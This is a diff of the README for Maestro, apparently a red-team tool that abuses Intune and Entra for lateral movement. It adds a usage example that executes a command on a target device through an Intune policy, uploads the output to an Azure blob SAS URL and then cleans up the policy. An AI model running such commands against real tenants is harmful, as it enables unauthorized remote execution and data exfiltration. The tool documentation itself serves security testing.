@@ -17,13 +17,6 @@ Maestro's lateral movement functions were inspired by [Death from Above: Lateral
 
 You can read more in this introductory blog post for Maestro: https://posts.specterops.io/maestro-9ed71d38d546
 
-# Syntax
-`Maestro.exe <command> [subcommand] [options]`
-
-All commands and subcommands have a help page that is generated using a custom command line parser to keep the size of the binary to a minimum. Help pages can be accessed by entering any Maestro command followed by `-h` or `--help`.
-
-Please refer to the output of the `--help` option for each command for the most up-to-date usage information.
-
 # Features
 - Real-time PowerShell script execution (via Proactive Remediations)
 - Application execution
@@ -31,6 +24,15 @@ Please refer to the output of the `--help` option for each command for the most 
 - Force device check-in and sync
 - Intune and Entra object enumeration
 - Local database to store credentials and query results
+
+# Syntax
+`Maestro.exe <command> [subcommand] [options]`
+
+All commands and subcommands have a help page that is generated using a custom command line parser to keep the size of the binary to a minimum. Help pages can be accessed by entering any Maestro command followed by `-h` or `--help`.
+
+Please refer to the output of the `--help` option for each command for the most up-to-date usage information.
+
+Examples can be found at the bottom of this file.
 
 # vNext
 - Local Endpoint Privilege Management (EPM) enumeration
@@ -50,3 +52,30 @@ Some Maestro features were inspired by or built based on the work of others, inc
 - [ROADtoken](https://github.com/dirkjanm/ROADtoken), by Dirk-jan Mollema ([@_dirkjan](https://x.com/_dirkjan))
 
 If you're interested in collaborating, please hit me up on Twitter ([@_Mayyhem](https://twitter.com/_Mayyhem)) or in the [BloodHoundGang Slack](http://ghst.ly/BHSlack)!
+
+# Examples
+Execute `dsregcmd.exe` on the Intune device with ID `e537180b-6d04-427e-bf93-dbde818400eb`, uploading results to the Azure Storage Blob Container SAS URL with a shared access token:
+```
+.\Maestro.exe exec intune upload -i e537180b-6d04-427e-bf93-dbde818400eb -n MyPolicy --url 'https://maestro2go.blob.core.windows.net/uploads?st=2025-01-14T20:19:57Z&se=2025-01-15T04:19:57Z&si=All&sv=2022-11-02&sr=c&sig=QYri...ZkpA%3D' --commands "%windir%\system32\dsregcmd.exe"
+...
+2025-01-14 20:20:28.251 UTC - [INFO]    Creating new device assignment filter with displayName: d004a709-aae6-4fbf-91cd-48f227272c97
+2025-01-14 20:20:28.251 UTC - [INFO]    Requesting devices from Intune
+2025-01-14 20:20:28.267 UTC - [INFO]    Requesting IntuneDevices from Microsoft Graph
+2025-01-14 20:20:28.783 UTC - [INFO]    Found 1 IntuneDevice matching query in Microsoft Graph
+2025-01-14 20:20:29.017 UTC - [INFO]    Found 1 devices in filtered results
+2025-01-14 20:20:29.361 UTC - [INFO]    Obtained filter ID: 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
+2025-01-14 20:20:29.379 UTC - [INFO]    Creating custom config policy for device: e537180b-6d04-427e-bf93-dbde818400eb
+2025-01-14 20:20:29.649 UTC - [INFO]    Obtained policy ID: fbca5c35-5282-4ec7-87de-a2d16a743079
+2025-01-14 20:20:29.680 UTC - [INFO]    Assigning policy fbca5c35-5282-4ec7-87de-a2d16a743079 with filter 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
+2025-01-14 20:20:29.983 UTC - [INFO]    Successfully assigned policy with filter
+2025-01-14 20:20:29.983 UTC - [INFO]    Successfully created and assigned diagnostic logs policy with request ID 651d2244-4ad7-4efe-bb5e-d017b0c27750
+2025-01-14 20:20:29.999 UTC - [INFO]    Not syncing automatically, execute the following to force device sync:
+
+    .\Maestro.exe exec intune sync -i e537180b-6d04-427e-bf93-dbde818400eb
+
+Clean up after execution:
+    .\Maestro.exe delete intune policy -i fbca5c35-5282-4ec7-87de-a2d16a743079
+    .\Maestro.exe delete intune filter -i 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
+
+2025-01-14 20:20:29.999 UTC - [INFO]    Completed execution in 00:00:04.8572902
+```
